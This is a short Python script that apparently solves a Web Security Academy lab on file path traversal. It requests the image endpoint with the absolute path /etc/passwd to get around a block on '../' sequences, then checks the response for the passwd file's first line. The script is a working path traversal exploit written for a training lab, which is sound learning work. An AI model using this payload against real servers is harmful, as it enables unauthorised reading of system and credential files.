# Lab: File path traversal, traversal sequences blocked with absolute path bypass
import requests

base = "https://0ace008c037b68a28054cb5300de002d.web-security-academy.net"
s = requests.Session()

print("===========[step1] get image with specific params===============")
page_image = s.get(f"{base}/image", params={"filename": "26.jpg"})
print("status:", page_image.status_code)
print("type:", page_image.headers["Content-Type"], "/ size:", len(page_image.content))

print("===========[step2] Do pathtraversal to get passwd===============")
# this lab blocks "../" string so i tried absolute path
r = s.get(f"{base}/image", params={"filename": "/etc/passwd"})
print("status:", r.status_code)
if "root:x:0:0" in r.text:          # passwd 첫 줄이 있으면 성공
    print("[+] traversal success")
    print(r.text[:200])             # 앞부분만 출력
else:
    print("[-] failed:", r.text)